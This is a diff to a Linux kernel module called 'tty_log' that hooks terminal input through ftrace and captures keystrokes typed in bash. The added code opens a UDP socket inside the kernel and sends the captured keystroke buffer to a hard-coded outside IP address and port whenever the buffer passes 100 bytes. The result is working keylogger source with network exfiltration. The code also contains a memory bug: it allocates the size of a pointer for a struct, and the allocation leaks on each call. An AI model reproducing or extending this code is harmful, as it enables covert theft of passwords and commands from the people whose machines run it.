@@ -13,6 +13,11 @@
 #include <linux/uaccess.h>
 #include <linux/linkage.h>
 #include <linux/tty.h>
+#include <linux/errno.h>
+#include <linux/netdevice.h>
+#include <linux/ip.h>
+#include <linux/in.h>
+#include <linux/socket.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("hyp");
@@ -20,7 +25,7 @@ MODULE_AUTHOR("hyp");
 #define DEVICE_NAME "tty_log"
 #define SUCCESS 0
 #define BUF_SIZE 10000
-
+#define IP_ADD ((uint32_t)0x08080808)
 
 #define HOOK(_name, _function, _original) \
 	{									  \
@@ -29,11 +34,20 @@ MODULE_AUTHOR("hyp");
 		.original = (_original),		  \
 	}									  
 
+struct ksock_t {
+	struct socket *sock;
+	struct sockaddr_in addr;
+	int running;
+};
 
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
 static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);
+
+static int ksock_open(struct ksock_t *);
+static int ksock_send(struct socket *, struct sockaddr_in *, 
+		unsigned char *, int);
 
 int is_open, last_count, count, kb_offset = 0;
 
@@ -147,29 +161,37 @@ void remove_hooks(struct ftrace_hook *hooks, size_t count) {
 		remove_hook(&hooks[i]);
 }
 
-void remove_str(char *str, char *sub) {
-	char *match;
-	int len = strlen(sub);
-
-	while((match = strstr(str, sub))) {
-		*match = '\0';
-		strcat(str, match+len);
-	}
-}
-
 static asmlinkage int (*tty_fixed_flag)(struct tty_port *port,
 		const unsigned char *chars, char flag, size_t size);
 
 static asmlinkage int ftrace_fixed_flag(struct tty_port *port,
 		const unsigned char *chars, char flag, size_t size) {
 	
-	int ret, cpid;
+	int ret, cpid, sent_size;
+
+	struct ksock_t *ksock = kmalloc(sizeof(struct ksock_t *), GFP_KERNEL);
 
 	cpid = (int)task_tgid_nr(current);
 	if(!strncmp(current->comm, "bash", strlen("bash"))) {		
-		if((strlen(tty_keybuf) + size) > 9999) {
-			//clear the buffer
+		if((strlen(tty_keybuf) + size) > 100) {
+	
+			ksock->running = 1;
+
+			ksock_open(ksock);
+			
+			if((sent_size = ksock_send(ksock->sock, &ksock->addr, tty_keybuf, 
+					(int)strlen(tty_keybuf))) < 0) {
+				
+				pr_info("error: %d\n", sent_size);
+			}
+			
+			sock_release(ksock->sock);
+			ksock->sock = NULL;
+			
+			pr_info("sent: %d\n", sent_size);
 			tty_keybuf[0] = '\0';
+
+			ksock->running = 0;
 		}
 		
 		//pr_info("comm: %s pid: %d kb_size: %d size: %d\n", current->comm, 
@@ -181,28 +203,6 @@ static asmlinkage int ftrace_fixed_flag(struct tty_port *port,
 	//pr_info("current->comm: %s\n", current->comm);
 	ret = tty_fixed_flag(port, chars, flag, size);
 	
-	return ret;
-}
-
-
-
-static asmlinkage ssize_t (*real_read)(struct tty_struct *tty, 
-		const unsigned char *buf, int c);
-
-static asmlinkage ssize_t ftrace_read(struct tty_struct *tty, 
-		const unsigned char *buf, int c) {
-	size_t ret;
-	int cpid;
-	char *hold = (char*)buf;
-
-	cpid = (int)task_tgid_nr(current);
-	if(cpid == 5363) {
-		remove_str(hold, "@hyp");
-		memcpy(tty_keybuf+kb_offset, hold, sizeof(buf));
-		kb_offset += sizeof(buf);
-	}
-
-	ret = real_read(tty, buf, c);
 	return ret;
 }
 
@@ -230,6 +230,61 @@ static struct ftrace_hook tty_hooks[] = {
 static void kill_ftrace(unsigned long data) {
 	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
 	return;
+}
+
+static int ksock_open(struct ksock_t *ksock) {
+	int err;
+	
+
+	if((err = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, 
+					&ksock->sock)) < 0) {
+		pr_info("could not create socket error = %d\n", err);
+		return err;
+	}
+
+	memset(&ksock->addr, 0, sizeof(struct sockaddr));
+	ksock->addr.sin_family = AF_INET;
+	ksock->addr.sin_addr.s_addr = htonl(IP_ADD);
+	ksock->addr.sin_port = htons(13373);
+
+	if((err = ksock->sock->ops->connect(ksock->sock, 
+					(struct sockaddr *)&ksock->addr, 
+					sizeof(struct sockaddr), 0)) < 0) {
+
+			pr_info("could not connect, error %d\n", err);
+	}
+
+	pr_info("connected");
+
+	return 0;
+}
+
+static int ksock_send(struct socket *sock, struct sockaddr_in *addr,
+		unsigned char *buf, int len) {
+
+	int size;
+
+	struct msghdr msg;
+	struct iovec iov;
+	
+	if(sock->sk == NULL)
+		return 0;
+
+	iov.iov_base = buf;
+	iov.iov_len = len;
+
+	iov_iter_init(&msg.msg_iter, READ, &iov, 1, 1);
+
+	msg.msg_flags = 0;
+	msg.msg_name = addr;
+	msg.msg_namelen = sizeof(struct sockaddr_in);
+	msg.msg_control = NULL;
+	msg.msg_controllen = 0;
+	msg.msg_control = NULL;
+
+	size = sock_sendmsg(sock, &msg);
+
+	return size;
 }
 
 static int device_open(struct inode *inode, struct file *file) {
